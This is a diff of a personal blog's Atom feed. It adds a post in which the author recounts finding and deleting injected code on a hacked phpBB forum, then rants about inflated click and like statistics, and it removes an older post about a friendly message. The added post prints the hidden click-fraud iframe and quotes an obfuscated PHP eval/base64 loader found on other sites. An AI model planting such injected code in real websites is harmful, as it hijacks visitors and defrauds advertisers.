@@ -4,7 +4,7 @@
   <title><![CDATA[DV Digital]]></title>
   <link href="http://www.dan-vidal.com//atom.xml" rel="self"/>
   <link href="http://www.dan-vidal.com//"/>
-  <updated>2012-09-27T12:40:32-04:00</updated>
+  <updated>2012-09-27T23:28:12-04:00</updated>
   <id>http://www.dan-vidal.com//</id>
   <author>
     <name><![CDATA[Dan Vidal - Pod]]></name>
@@ -12,6 +12,123 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
+    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
+    <updated>2012-09-27T23:34:00-04:00</updated>
+    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
+    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>
+
+<p>Every so often, websites are hacked. Sometimes it&#8217;s bad, sometimes it&#8217;s harmless. The usual goal is to infect a viewer&#8217;s computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of &#8220;harmless&#8221;, are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>
+
+<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can&#8217;t trust them&#8230;</p>
+
+<!-- more -->
+
+
+<p>Why not?</p>
+
+<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it&#8217;s cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don&#8217;t add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to &#8220;peer over the walls&#8221;, as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it&#8217;s hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>
+
+<p>So, people invariably get in.</p>
+
+<p>I first noticed something was amiss when I could not login to the forum&#8217;s administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser&#8217;s status bar. The redirects were pointing towards a site called &#8220;clickspro.org&#8221;. Now, since I helped build TNL, I know each and every aspect of it&#8217;s functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it&#8217;s been over three years since TNL has explicitly seen any new features.</p>
+
+<p>So, I started a little investigating.</p>
+
+<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn&#8217;t. I used the UNIX tool &#8220;cURL&#8221; to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This rendered the admin control panel for TNL in it&#8217;s raw HTML format. Therein, I spotted the offending code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe></span></code></pre></td></tr></table></div></figure>
+
+
+<p>That does not belong.</p>
+
+<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>
+
+<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>
+
+<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn&#8217;t find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>
+
+<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>
+
+<blockquote><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php 
+</span><span class='line'>
+</span><span class='line'>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI
+</span><span class='line'>
+</span><span class='line'>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf
+</span><span class='line'>
+</span><span class='line'>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387
+</span><span class='line'>
+</span><span class='line'>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt
+</span><span class='line'>
+</span><span class='line'>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2
+</span><span class='line'>
+</span><span class='line'>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX
+</span><span class='line'>
+</span><span class='line'>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs
+</span><span class='line'>
+</span><span class='line'>K/5DdO/p8AAAD//w==')));?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I&#8217;m not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don&#8217;t know what USENET is, Google it.</p>
+
+<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>
+
+<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>
+
+<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>
+
+<p>What mystifies me though, and I&#8217;m finally getting to the point of this rant, is that to implement this, it took some doing. This wasn&#8217;t a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>
+
+<p>A lot of effort, for little return. Clicks, likes, and impressions. It&#8217;s all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it&#8217;s an ecommerce site, are people buying anything? If it&#8217;s a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>
+
+<p>It&#8217;s sad that people actually pay for this sort of thing. It&#8217;s why my tactic with regards to web properties I don&#8217;t explicitly own or have control over is to get people off them as fast as possible. I&#8217;ll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don&#8217;t harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I&#8217;d rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I&#8217;m the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don&#8217;t play the stats game. I&#8217;ve opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>
+
+<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn&#8217;t find it so, it&#8217;s really annoying.</p>
+
+<p>Give me the real data and content.</p>
+
+<p>And to the kid in Manila? Sorry about that. I know you&#8217;re just doing your job, and it&#8217;s better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>
+
+<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[More on the Canon 50 1.2 L]]></title>
@@ -856,38 +973,6 @@ Hm, maybe the community spirit is still around in a way. That&#8217;s something.
 <p>Now, of course I&#8217;m smart about it. I really only drive when I have to, and I still avail myself of public options when it&#8217;s convenient or safe to do so, hence my retaining of my Easy Card and having a Car 2 Go membership. Keeping those options around (I switched my Easy Card to &#8220;refill when needed&#8221;) doesn&#8217;t cost any money unless you use it, so it&#8217;s nice to have a &#8220;B&#8221; and &#8220;C&#8221; option, and a &#8220;too cheap to ride a cab and am going out for a drink or five&#8221; option too.</p>
 
 <p>So, some of the &#8220;old Pod&#8221; still remains. Go figure.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[One of the things that makes it worthwhile.]]></title>
-    <link href="http://www.dan-vidal.com//blog/2012/08/28/one-of-the-things-that-makes-it-worthwhile/"/>
-    <updated>2012-08-28T21:50:00-04:00</updated>
-    <id>http://www.dan-vidal.com//blog/2012/08/28/one-of-the-things-that-makes-it-worthwhile</id>
-    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/thanx.png" width="258" height="280" title="'Thanks!'" ></p>
-
-<p>Like I&#8217;ve stated before. I don&#8217;t really do what I do with the end-goal of money in my sights. Having money is nice, and certainly has it&#8217;s benefits in today&#8217;s society, but I&#8217;ve found along the way that if your driving force is solely the acquisition of it, and the conspicuous consumption of it, it will corrupt. I&#8217;ve seen some really good people turn into <em>raging assholes</em> because of it. Or just plain old douchebags. Pardon my language.</p>
-
-<p>I do what I do because I really love to do it. Photo work, video work, and the occasional web project keep me happy and put food on the table, and allow for a balance in my life to spend with friends and family. I don&#8217;t expect any sort of accolade or reward.</p>
-
-<p>But occasionally they do come in.</p>
-
-<!-- more -->
-
-
-<p>I tend to laugh off social networking as a diversion and, at the business level, a potential waste of resources. The most successful businesspeople in the world that I personally know and know of didn&#8217;t build their empires by posting Facebook posts and ads, but they did it pretty much by turning out a good product or service. Yes, you gotta get the word out, but the business will come to you after that initial push.</p>
-
-<p>But, anyways, I was talking about social networking, not business. Oh, by the way, I don&#8217;t have much in the way of business acumen. I can tell you what camera or computer to buy, but beyond that, you&#8217;re on your own.</p>
-
-<p>Social networking, right. Yes, it&#8217;s mostly a diversion and a front for large-scale data mining that would make the KGB envious, but sometimes it does have it&#8217;s moments.</p>
-
-<p>Like tonight. The person in the Facebook chat window above friend-requested me earlier this evening. Now, I didn&#8217;t quite recognize this person off the bat, but we had enough mutual known friends for me to theorize that we had met at some point in the past. So, I figured I would &#8220;clear&#8221; this person and take it from there. If they proved to be a spammer or an unscrupulous promoter, it would take all of five seconds to screen them. Facebook does do things right on occasion.</p>
-
-<p>About a few minutes later, the above message came through. I was out on a run and unfortunately the person was offline by the time I got back, so realtime communication wasn&#8217;t possible. However, at the risk of being sappy, that did make my night. Again, I don&#8217;t expect awards or accolades for my work, but when they come in completely unsolicited, it does make my day.</p>
-
-<p>Thank you kind semi-stranger. You made my night.</p>
-
-<p>OK, back to my scheduled ranting and raving.</p>
 ]]></content>
   </entry>
   
